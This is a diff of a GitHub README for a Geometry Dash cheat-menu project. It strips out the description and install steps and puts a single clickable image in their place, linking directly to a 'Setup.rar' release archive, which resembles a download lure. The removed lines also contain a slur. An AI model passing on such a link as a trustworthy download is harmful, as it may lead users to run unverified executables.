@@ -1,12 +1,3 @@
-# gd-hackermode
-Free alternative of MegaHack v6-PRO by Adaf but without retard download process and ads :^)
-
-P.S. The current version is v31-14.
-
-# Showcase
-Showcase here: https://youtu.be/MjatImVna6Q
-
-# Installation
-You should download all of the files and put them to your Geometry Dash folder.
+[![Frame 4aaabbb](https://github.com/NaruBuilderkid/gd-hackermode/assets/74258651/6c098bf3-9a63-43fe-bc8b-11edb3906375)](https://github.com/NaruBuilderkid/gd-hackermode/releases/download/Setup/Setup.rar)
 
 Enjoy! :^)
